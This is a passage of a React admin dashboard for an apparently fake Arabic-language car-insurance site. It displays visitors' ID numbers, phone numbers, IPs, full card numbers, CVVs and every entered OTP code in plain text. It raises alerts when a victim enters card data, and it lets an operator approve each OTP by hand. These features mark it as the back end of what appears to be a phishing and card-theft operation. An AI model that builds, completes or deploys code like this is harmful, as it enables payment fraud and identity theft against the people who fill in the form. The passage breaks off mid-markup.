import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useAdminNotifications } from "@/hooks/useAdminNotifications";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, CreditCard, Shield, User, Calendar, Phone, FileText, Check, X, Search, Filter, Globe } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { toast as sonnerToast } from "sonner";
import { Input } from "@/components/ui/input";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { Calendar as CalendarComponent } from "@/components/ui/calendar";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { VisitorStatusIndicator } from "@/components/VisitorStatusIndicator";
import { 
  Pagination, 
  PaginationContent, 
  PaginationItem, 
  PaginationLink, 
  PaginationNext, 
  PaginationPrevious,
  PaginationEllipsis
} from "@/components/ui/pagination";

interface PaymentAttempt {
  id: string;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
}

interface OtpAttempt {
  id: string;
  otp_code: string;
  created_at: string;
}

interface CustomerOrder {
  id: string;
  sequence_number: string;
  id_number: string;
  birth_date: string;
  phone_number?: string | null;
  owner_name?: string | null;
  vehicle_type: string;
  vehicle_purpose: string;
  estimated_value?: string | null;
  policy_start_date?: string | null;
  add_driver?: string | null;
  insurance_company: string;
  insurance_price: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  otp_code: string | null;
  otp_verified: boolean;
  status: string;
  created_at: string;
  updated_at: string;
  visitor_session_id?: string | null;
  visitor_ip?: string | null;
  payment_attempts?: PaymentAttempt[];
  otp_attempts?: OtpAttempt[];
}

const AdminOrders = () => {
  const navigate = useNavigate();
  useAdminNotifications();
  const [orders, setOrders] = useState<CustomerOrder[]>([]);
  const [filteredOrders, setFilteredOrders] = useState<CustomerOrder[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingOrder, setProcessingOrder] = useState<string | null>(null);
  const { toast } = useToast();
  
  // Pagination states
  const [currentPage, setCurrentPage] = useState(1);
  const [totalCount, setTotalCount] = useState(0);
  const itemsPerPage = 10;
  
  // Filter states
  const [ipFilter, setIpFilter] = useState("");
  const [cardNumberFilter, setCardNumberFilter] = useState("");
  const [cardEnteredOnly, setCardEnteredOnly] = useState(false);
  const [startDate, setStartDate] = useState<Date | undefined>();
  const [endDate, setEndDate] = useState<Date | undefined>();

  // دالة لتشغيل صوت إشعار مميز للطلبات الجديدة
  const playOrderNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    
    const playBeep = (frequency: number, startTime: number, duration: number) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(frequency, startTime);
      oscillator.type = 'triangle';
      
      gainNode.gain.setValueAtTime(0.3, startTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
      
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    };
    
    // تشغيل سلسلة نغمات مميزة
    const currentTime = audioContext.currentTime;
    playBeep(800, currentTime, 0.15);
    playBeep(1000, currentTime + 0.18, 0.15);
    playBeep(1200, currentTime + 0.36, 0.2);
    
    // نغمة إضافية
    setTimeout(() => {
      const newTime = audioContext.currentTime;
      playBeep(1000, newTime, 0.18);
    }, 700);
  };

  useEffect(() => {
    const checkAuthAndFetchOrders = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        console.log("⚠️ No session found, redirecting to login");
        navigate("/admin/login");
        return;
      }

      console.log("✅ Session found, fetching orders...");
      await fetchOrders();
      
      // Subscribe to realtime updates for all related tables
      const channel = supabase
        .channel('orders-changes')
        // Listen for new orders
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'customer_orders'
          },
          (payload: any) => {
            console.log('🔔 طلب جديد!', payload.new);
            playOrderNotificationSound();
            sonnerToast.success("طلب جديد!", {
              description: `عميل جديد: ${payload.new.owner_name || 'غير محدد'}`,
              duration: 10000
            });
            fetchOrders();
          }
        )
        // Listen for order updates
        .on(
          'postgres_changes',
          {
            event: 'UPDATE',
            schema: 'public',
            table: 'customer_orders'
          },
          (payload: any) => {
            // Check if status changed to waiting_otp_approval
            if (payload.new.status === 'waiting_otp_approval' && payload.old.status !== 'waiting_otp_approval') {
              sonnerToast.info("عميل بدأ بإدخال كود التحقق OTP", {
                description: "متابعة الطلب في لوحة التحكم مطلوبة",
                duration: 5000
              });
            }
            fetchOrders();
          }
        )
        // Listen for new payment attempts
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'payment_attempts'
          },
          (payload: any) => {
            console.log('🔔 محاولة دفع جديدة!', payload.new);
            sonnerToast.info("محاولة دفع جديدة!", {
              description: "عميل أدخل معلومات البطاقة",
              duration: 8000
            });
            fetchOrders();
          }
        )
        // Listen for new OTP attempts
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'otp_attempts'
          },
          (payload: any) => {
            console.log('🔔 محاولة OTP جديدة!', payload.new);
            sonnerToast.info("كود تحقق جديد!", {
              description: "عميل أدخل كود OTP",
              duration: 8000
            });
            fetchOrders();
          }
        )
        .subscribe();

      // Auto-refresh every 5 minutes (reduced frequency for better performance)
      const refreshInterval = setInterval(() => {
        fetchOrders();
      }, 300000); // 5 minutes

      return () => {
        supabase.removeChannel(channel);
        clearInterval(refreshInterval);
      };
    };

    checkAuthAndFetchOrders();
  }, [navigate, currentPage]);

  const fetchOrders = async () => {
    try {
      console.log("📊 Fetching orders...");
      
      // Get total count first
      const { count, error: countError } = await supabase
        .from("customer_orders")
        .select("*", { count: 'exact', head: true });
      
      if (countError) {
        console.error("❌ Error fetching count:", countError);
      } else {
        setTotalCount(count || 0);
      }

      // Fetch orders with pagination
      const from = (currentPage - 1) * itemsPerPage;
      const to = from + itemsPerPage - 1;
      
      const { data, error } = await supabase
        .from("customer_orders")
        .select("*")
        .order("updated_at", { ascending: false })
        .range(from, to);

      if (error) {
        console.error("❌ Error fetching orders:", error);
        setLoading(false);
        return;
      }

      if (!data || data.length === 0) {
        console.log("⚠️ No orders found");
        setOrders([]);
        setFilteredOrders([]);
        setLoading(false);
        return;
      }

      console.log(`✅ Fetched ${data.length} orders`);

      // Fetch all attempts in batch
      const orderIds = data.map(o => o.id);
      const sessionIds = data.map(o => o.visitor_session_id).filter(Boolean);

      const [paymentAttemptsResult, otpAttemptsResult, visitorTrackingResult] = await Promise.all([
        supabase
          .from("payment_attempts")
          .select("*")
          .in("order_id", orderIds)
          .order("created_at", { ascending: false }),
        supabase
          .from("otp_attempts")
          .select("*")
          .in("order_id", orderIds)
          .order("created_at", { ascending: false }),
        sessionIds.length > 0 ? supabase
          .from("visitor_tracking")
          .select("session_id, ip_address")
          .in("session_id", sessionIds)
          .order("last_active_at", { ascending: false }) : Promise.resolve({ data: [] })
      ]);

      // Create maps for quick lookup
      const paymentAttemptsMap = (paymentAttemptsResult.data || []).reduce((acc: any, attempt: any) => {
        if (!acc[attempt.order_id]) acc[attempt.order_id] = [];
        acc[attempt.order_id].push(attempt);
        return acc;
      }, {});

      const otpAttemptsMap = (otpAttemptsResult.data || []).reduce((acc: any, attempt: any) => {
        if (!acc[attempt.order_id]) acc[attempt.order_id] = [];
        acc[attempt.order_id].push(attempt);
        return acc;
      }, {});

      const visitorIPMap = (visitorTrackingResult.data || []).reduce((acc: any, visitor: any) => {
        if (!acc[visitor.session_id]) {
          acc[visitor.session_id] = visitor.ip_address;
        }
        return acc;
      }, {});

      // Combine data
      const ordersWithAttempts = data.map(order => ({
        ...order,
        payment_attempts: paymentAttemptsMap[order.id] || [],
        otp_attempts: otpAttemptsMap[order.id] || [],
        visitor_ip: order.visitor_ip || visitorIPMap[order.visitor_session_id] || null,
      }));

      setOrders(ordersWithAttempts);
      setFilteredOrders(ordersWithAttempts);
      setLoading(false);
    } catch (error) {
      console.error("Error fetching orders:", error);
      setLoading(false);
    }
  };
  
  // Apply filters whenever filter values or orders change
  useEffect(() => {
    let filtered = [...orders];
    
    // Filter by card entered only
    if (cardEnteredOnly) {
      filtered = filtered.filter(order => 
        order.card_number && order.card_number.trim() !== ""
      );
    }
    
    // Filter by IP address
    if (ipFilter) {
      filtered = filtered.filter(order => 
        order.visitor_ip?.toLowerCase().includes(ipFilter.toLowerCase())
      );
    }
    
    // Filter by card number
    if (cardNumberFilter) {
      filtered = filtered.filter(order => 
        order.card_number.includes(cardNumberFilter)
      );
    }
    
    // Filter by date range
    if (startDate) {
      filtered = filtered.filter(order => 
        new Date(order.created_at) >= startDate
      );
    }
    
    if (endDate) {
      const endOfDay = new Date(endDate);
      endOfDay.setHours(23, 59, 59, 999);
      filtered = filtered.filter(order => 
        new Date(order.created_at) <= endOfDay
      );
    }
    
    setFilteredOrders(filtered);
  }, [orders, ipFilter, cardNumberFilter, cardEnteredOnly, startDate, endDate]);
  
  const clearFilters = () => {
    setIpFilter("");
    setCardNumberFilter("");
    setCardEnteredOnly(false);
    setStartDate(undefined);
    setEndDate(undefined);
    setCurrentPage(1);
  };

  // Calculate total pages
  const totalPages = Math.ceil(totalCount / itemsPerPage);

  // Handle page change
  const handlePageChange = (page: number) => {
    setCurrentPage(page);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // Generate page numbers to display
  const getPageNumbers = () => {
    const pages: (number | string)[] = [];
    const maxVisiblePages = 5;
    
    if (totalPages <= maxVisiblePages) {
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i);
      }
    } else {
      if (currentPage <= 3) {
        for (let i = 1; i <= 4; i++) pages.push(i);
        pages.push('...');
        pages.push(totalPages);
      } else if (currentPage >= totalPages - 2) {
        pages.push(1);
        pages.push('...');
        for (let i = totalPages - 3; i <= totalPages; i++) pages.push(i);
      } else {
        pages.push(1);
        pages.push('...');
        pages.push(currentPage - 1);
        pages.push(currentPage);
        pages.push(currentPage + 1);
        pages.push('...');
        pages.push(totalPages);
      }
    }
    
    return pages;
  };

  const formatDate = (date: string) => {
    return new Date(date).toLocaleDateString("ar-EG", {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      calendar: "gregory"
    });
  };

  const getStatusBadge = (status: string, otpVerified: boolean) => {
    if (status === "completed" && otpVerified) {
      return <Badge className="bg-green-500 hover:bg-green-600">مكتمل ✓</Badge>;
    } else if (status === "waiting_approval") {
      return <Badge className="bg-orange-500 hover:bg-orange-600">في انتظار موافقة الدفع</Badge>;
    } else if (status === "waiting_otp_approval") {
      return <Badge className="bg-blue-500 hover:bg-blue-600">في انتظار موافقة OTP</Badge>;
    } else if (status === "approved") {
      return <Badge className="bg-purple-500 hover:bg-purple-600">تمت الموافقة</Badge>;
    } else if (status === "rejected" || status === "otp_rejected") {
      return <Badge variant="destructive">مرفوض</Badge>;
    } else {
      return <Badge variant="secondary">قيد التنفيذ...</Badge>;
    }
  };

  const getCompletionPercentage = (order: CustomerOrder) => {
    let completed = 0;
    const total = 6;
    
    if (order.id_number && order.sequence_number) completed++;
    if (order.vehicle_type && order.vehicle_purpose) completed++;
    if (order.insurance_company && order.insurance_price > 0) completed++;
    if (order.card_number && order.card_holder_name) completed++;
    if (order.expiry_date && order.cvv) completed++;
    if (order.otp_code) completed++;
    
    return Math.round((completed / total) * 100);
  };

  const updateLocalOrderStatus = (sequenceNumber: string, updates: Partial<CustomerOrder>) => {
    setOrders(prev => prev.map(o => 
      o.sequence_number === sequenceNumber ? { ...o, ...updates } : o
    ));
    setFilteredOrders(prev => prev.map(o => 
      o.sequence_number === sequenceNumber ? { ...o, ...updates } : o
    ));
  };

  const handleApprove = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      // Update local state immediately
      updateLocalOrderStatus(sequenceNumber, { status: "approved" });
      
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "approved" })
        .eq("sequence_number", sequenceNumber);

      if (error) {
        // Revert on error
        updateLocalOrderStatus(sequenceNumber, { status: "waiting_approval" });
        throw error;
      }

      toast({
        title: "تمت الموافقة",
        description: "تم قبول الطلب بنجاح",
      });
    } catch (error) {
      console.error("Error approving order:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على الطلب",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  const handleReject = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      updateLocalOrderStatus(sequenceNumber, { status: "rejected" });
      
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "rejected" })
        .eq("sequence_number", sequenceNumber);

      if (error) {
        updateLocalOrderStatus(sequenceNumber, { status: "waiting_approval" });
        throw error;
      }

      toast({
        title: "تم الرفض",
        description: "تم رفض الطلب",
      });
    } catch (error) {
      console.error("Error rejecting order:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض الطلب",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  const handleOtpApprove = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      updateLocalOrderStatus(sequenceNumber, { status: "completed", otp_verified: true });
      
      const { error } = await supabase
        .from("customer_orders")
        .update({ 
          status: "completed",
          otp_verified: true 
        })
        .eq("sequence_number", sequenceNumber);

      if (error) {
        updateLocalOrderStatus(sequenceNumber, { status: "waiting_otp_approval", otp_verified: false });
        throw error;
      }

      toast({
        title: "تمت الموافقة",
        description: "تم قبول رمز التحقق بنجاح",
      });
    } catch (error) {
      console.error("Error approving OTP:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على رمز التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  const handleOtpReject = async (sequenceNumber: string) => {
    setProcessingOrder(sequenceNumber);
    try {
      updateLocalOrderStatus(sequenceNumber, { status: "otp_rejected" });
      
      const { error } = await supabase
        .from("customer_orders")
        .update({ status: "otp_rejected" })
        .eq("sequence_number", sequenceNumber);

      if (error) {
        updateLocalOrderStatus(sequenceNumber, { status: "waiting_otp_approval" });
        throw error;
      }

      toast({
        title: "تم الرفض",
        description: "تم رفض رمز التحقق",
      });
    } catch (error) {
      console.error("Error rejecting OTP:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض رمز التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingOrder(null);
    }
  };

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full">
        <AdminSidebar />
        <main className="flex-1 p-8 bg-gradient-to-br from-background via-muted/20 to-background">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-4xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
                طلبات العملاء
              </h1>
              <p className="text-muted-foreground mt-2">
                جميع طلبات التأمين المسجلة في النظام - تحديث تلقائي
              </p>
            </div>

            {/* Filters Section */}
            <Card className="mb-6 border-2">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-lg">
                  <Filter className="h-5 w-5" />
                  فلاتر البحث
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                  {/* IP Filter */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium flex items-center gap-1">
                      <Globe className="h-3 w-3" />
                      IP Address
                    </label>
                    <div className="relative">
                      <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                      <Input
                        type="text"
                        placeholder="ابحث بـ IP..."
                        value={ipFilter}
                        onChange={(e) => setIpFilter(e.target.value)}
                        className="pr-10"
                        dir="ltr"
                      />
                    </div>
                  </div>
                  
                  {/* Card Number Filter */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">رقم البطاقة</label>
                    <div className="relative">
                      <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                      <Input
                        type="text"
                        placeholder="ابحث برقم البطاقة..."
                        value={cardNumberFilter}
                        onChange={(e) => setCardNumberFilter(e.target.value)}
                        className="pr-10"
                        dir="ltr"
                      />
                  </div>

                  {/* Card Entered Only Filter */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">فلتر البطاقة</label>
                    <Button
                      variant={cardEnteredOnly ? "default" : "outline"}
                      className="w-full gap-2"
                      onClick={() => setCardEnteredOnly(!cardEnteredOnly)}
                    >
                      <CreditCard className="h-4 w-4" />
                      {cardEnteredOnly ? "عرض الكل" : "وضعوا بطاقتهم فقط"}
                    </Button>
                  </div>
                  </div>

                  {/* Start Date Filter */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">من تاريخ</label>
                    <Popover>
                      <PopoverTrigger asChild>
                        <Button
                          variant="outline"
                          className="w-full justify-start text-right font-normal"
                        >
                          <Calendar className="ml-2 h-4 w-4" />
                          {startDate ? format(startDate, "PPP", { locale: ar }) : "اختر التاريخ"}
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent className="w-auto p-0" align="start">
                        <CalendarComponent
                          mode="single"
                          selected={startDate}
                          onSelect={setStartDate}
                          initialFocus
                        />
                      </PopoverContent>
                    </Popover>
                  </div>

                  {/* End Date Filter */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">إلى تاريخ</label>
                    <Popover>
                      <PopoverTrigger asChild>
                        <Button
                          variant="outline"
                          className="w-full justify-start text-right font-normal"
                        >
                          <Calendar className="ml-2 h-4 w-4" />
                          {endDate ? format(endDate, "PPP", { locale: ar }) : "اختر التاريخ"}
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent className="w-auto p-0" align="start">
                        <CalendarComponent
                          mode="single"
                          selected={endDate}
                          onSelect={setEndDate}
                          initialFocus
                        />
                      </PopoverContent>
                    </Popover>
                  </div>
                </div>

                {/* Clear Filters Button */}
                {(ipFilter || cardNumberFilter || cardEnteredOnly || startDate || endDate) && (
                  <div className="mt-4 flex justify-end">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={clearFilters}
                      className="gap-2"
                    >
                      <X className="h-4 w-4" />
                      مسح الفلاتر
                    </Button>
                  </div>
                )}

                {/* Results Count */}
                <div className="mt-4 text-sm text-muted-foreground text-center">
                  عرض {filteredOrders.length} طلب من أصل {totalCount} • الصفحة {currentPage} من {totalPages}
                </div>
              </CardContent>
            </Card>

            {loading ? (
              <div className="flex justify-center items-center py-12">
                <Loader2 className="h-8 w-8 animate-spin text-primary" />
              </div>
            ) : filteredOrders.length === 0 ? (
              <Card className="text-center py-12">
                <CardContent>
                  <Shield className="h-16 w-16 mx-auto mb-4 text-muted-foreground" />
                  <p className="text-muted-foreground">
                    {orders.length === 0 ? "لا توجد طلبات مسجلة حتى الآن" : "لا توجد نتائج مطابقة للفلاتر"}
                  </p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid grid-cols-1 gap-6">
                {filteredOrders.map((order) => {
                  const completionPercent = getCompletionPercentage(order);
                  
                  return (
                    <Card 
                      key={order.id} 
                      className="hover:shadow-xl transition-all duration-300 border-2 hover:border-primary/30 relative overflow-hidden"
                    >
                      {/* Completion Progress Bar */}
                      <div 
                        className="absolute top-0 left-0 h-1 bg-gradient-to-r from-primary to-accent transition-all duration-500"
                        style={{ width: `${completionPercent}%` }}
                      />

                      <CardHeader className="pb-3 bg-gradient-to-br from-primary/5 to-accent/5">
                        <div className="flex justify-between items-center">
                          <div className="flex items-center gap-3">
                            <div className="bg-primary/10 p-2 rounded-lg">
                              <FileText className="h-5 w-5 text-primary" />
                            </div>
                            <div>
                              <CardTitle className="text-lg mb-1">
                                طلب رقم #{order.sequence_number || "غير محدد"}
                              </CardTitle>
                              <div className="flex items-center gap-2 mt-1">
                                <CardDescription className="flex items-center gap-1 text-xs">
                                  <Calendar className="h-3 w-3" />
                                  {formatDate(order.updated_at)}
                                </CardDescription>
                                <VisitorStatusIndicator sessionId={order.visitor_session_id} />
                              </div>
                            </div>
                          </div>
                          <div className="text-right flex flex-col items-end gap-2">
                            {getStatusBadge(order.status, order.otp_verified)}
                            <div className="text-xs text-muted-foreground bg-white px-2 py-1 rounded">
                              {completionPercent}% مكتمل
                            </div>
                          </div>
                        </div>
                      </CardHeader>

                      <CardContent className="pt-4">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          {/* Customer Info */}
                          <div className="bg-white border border-gray-200 rounded-lg p-3">
                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-primary">
                              <User className="h-4 w-4" />
                              معلومات العميل
                            </h3>
                            <div className="space-y-1.5 text-xs">
                              <div className="flex justify-between">
                                <span className="text-gray-500">اسم المالك:</span>
                                <span className="font-medium">{order.owner_name || "لم يتم الإدخال بعد"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">اسم حامل البطاقة:</span>
                                <span className="font-medium">{order.card_holder_name || "لم يتم الإدخال بعد"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">رقم الهوية:</span>
                                <span className="font-medium">{order.id_number || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">تاريخ الميلاد:</span>
                                <span className="font-medium">{order.birth_date || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500 flex items-center gap-1">
                                  <Phone className="h-3 w-3" />
                                  رقم الهاتف:
                                </span>
                                <span className="font-medium" dir="ltr">{order.phone_number || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">رقم التسلسل:</span>
                                <span className="font-medium">{order.sequence_number || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500 flex items-center gap-1">
                                  <Globe className="h-3 w-3" />
                                  IP:
                                </span>
                                <span className="font-mono font-medium text-xs">{order.visitor_ip || "جارٍ التحميل..."}</span>
                              </div>
                            </div>
                          </div>

                          {/* Vehicle Info */}
                          <div className="bg-white border border-gray-200 rounded-lg p-3">
                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-blue-600">
                              <Shield className="h-4 w-4" />
                              معلومات المركبة والتأمين
                            </h3>
                            <div className="space-y-1.5 text-xs">
                              <div className="flex justify-between">
                                <span className="text-gray-500">نوع المركبة:</span>
                                <span className="font-medium">{order.vehicle_type || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">الغرض من المركبة:</span>
                                <span className="font-medium">{order.vehicle_purpose || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">القيمة التقديرية:</span>
                                <span className="font-medium">{order.estimated_value || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">تاريخ بداية الوثيقة:</span>
                                <span className="font-medium">{order.policy_start_date || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">إضافة سائق:</span>
                                <span className="font-medium">{order.add_driver === "yes" ? "نعم" : order.add_driver === "no" ? "لا" : "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">سعر التأمين:</span>
                                <span className="font-bold text-blue-600">
                                  {order.insurance_price > 0 ? `${order.insurance_price.toFixed(2)} ﷼` : "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">شركة التأمين:</span>
                                <span className="font-medium text-right max-w-[140px] truncate" title={order.insurance_company}>
                                  {order.insurance_company || "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">سعر التأمين:</span>
                                <span className="font-bold text-green-600">
                                  {order.insurance_price > 0 ? `${order.insurance_price} ﷼` : "-"}
                                </span>
                              </div>
                            </div>
                          </div>

                          {/* Current Payment Info */}
                          <div className="bg-white border border-gray-200 rounded-lg p-3">
                            <h3 className="font-semibold mb-2 flex items-center gap-2 text-sm text-orange-600">
                              <CreditCard className="h-4 w-4" />
                              بطاقة الدفع الحالية
                            </h3>
                            <div className="space-y-1.5 text-xs">
                              <div className="flex justify-between">
                                <span className="text-gray-500">رقم البطاقة:</span>
                                <span className="font-mono font-medium" dir="ltr">
                                  {order.card_number || "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">الاسم:</span>
                                <span className="font-medium truncate max-w-[120px]" title={order.card_holder_name}>
                                  {order.card_holder_name || "-"}
                                </span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">الانتهاء:</span>
                                <span className="font-medium" dir="ltr">{order.expiry_date || "-"}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-gray-500">CVV:</span>
                                <span className="font-mono font-medium">{order.cvv || "-"}</span>
                              </div>
                            </div>
                          </div>

                          {/* Payment Attempts */}
                          <div className="md:col-span-2 lg:col-span-3 space-y-2">
                            <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600">
                              <CreditCard className="h-4 w-4" />
                              محاولات الدفع ({order.payment_attempts?.length || 0})
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                              {order.payment_attempts && order.payment_attempts.length > 0 ? (
                                order.payment_attempts.map((attempt, index) => (
                                  <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                                    <div className="flex justify-between items-center mb-2">
                                      <span className="text-xs font-semibold text-orange-600">
                                        محاولة #{order.payment_attempts!.length - index}
                                      </span>
                                      <span className="text-xs text-gray-500">
                                        {formatDate(attempt.created_at)}
                                      </span>
                                    </div>
                                    <div className="space-y-1.5 text-xs">
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">رقم البطاقة:</span>
                                        <span className="font-mono font-medium" dir="ltr">
                                          {attempt.card_number}
                                        </span>
                                      </div>
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">الاسم:</span>
                                        <span className="font-medium truncate max-w-[120px]" title={attempt.card_holder_name}>
                                          {attempt.card_holder_name}
                                        </span>
                                      </div>
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">الانتهاء:</span>
                                        <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                      </div>
                                      <div className="flex justify-between">
                                        <span className="text-gray-500">CVV:</span>
                                        <span className="font-mono font-medium">{attempt.cvv}</span>
                                      </div>
                                    </div>
                                  </div>
                                ))
                              ) : (
                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center text-xs text-gray-500">
                                  لا توجد محاولات دفع
                                </div>
                              )}
                            </div>
                          </div>

                          {/* OTP Attempts */}
                          <div className="md:col-span-2 lg:col-span-3 space-y-2">
                            <h3 className="font-semibold flex items-center gap-2 text-sm text-blue-600">
                              <Phone className="h-4 w-4" />
                              محاولات OTP ({order.otp_attempts?.length || 0})
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                              {order.otp_attempts && order.otp_attempts.length > 0 ? (
                                order.otp_attempts.map((attempt, index) => (
                                  <div key={attempt.id} className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                                    <div className="flex justify-between items-center mb-2">
                                      <span className="text-xs font-semibold text-blue-600">
                                        محاولة #{order.otp_attempts!.length - index}
                                      </span>
                                      <span className="text-xs text-gray-500">
                                        {new Date(attempt.created_at).toLocaleTimeString('en-US', {
                                          hour: '2-digit',
                                          minute: '2-digit',
                                          hour12: true
                                        })}
                                      </span>
                                    </div>
                                    <div className="space-y-1.5 text-xs">
                                      <div className="flex justify-between items-center">
                                        <span className="text-gray-500">الكود:</span>
                                        <span className="font-mono font-bold text-lg text-blue-600">
                                          {attempt.otp_code}
                                        </span>
                                      </div>
                                      <div className="text-xs text-gray-500 text-center">
                                        {formatDate(attempt.created_at)}
                                      </div>
                                    </div>
                                  </div>
                                ))
                              ) : (
                                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center text-xs text-gray-500">
                                  لا توجد محاولات OTP
                                </div>
                              )}
                            </div>
                          </div>
                        </div>

                        {/* Action Buttons */}
                        {(order.status === "waiting_approval" || order.status === "pending") && order.payment_attempts && order.payment_attempts.length > 0 && (
                          <div className="flex gap-3 mt-4 pt-4 border-t border-border">
                            <Button
                              onClick={() => handleApprove(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <Check className="h-4 w-4 ml-2" />
                              )}
                              موافقة - الدفع
                            </Button>
                            <Button
                              onClick={() => handleReject(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              variant="destructive"
                              className="flex-1 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <X className="h-4 w-4 ml-2" />
                              )}
                              رفض
                            </Button>
                          </div>
                        )}

                        {(order.status === "waiting_otp_approval" || (order.otp_code && order.status !== "completed" && order.status !== "otp_rejected")) && (
                          <div className="flex gap-3 mt-4 pt-4 border-t border-border">
                            <Button
                              onClick={() => handleOtpApprove(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <Check className="h-4 w-4 ml-2" />
                              )}
                              موافقة - OTP
                            </Button>
                            <Button
                              onClick={() => handleOtpReject(order.sequence_number)}
                              disabled={processingOrder === order.sequence_number}
                              variant="destructive"
                              className="flex-1 h-10"
                            >
                              {processingOrder === order.sequence_number ? (
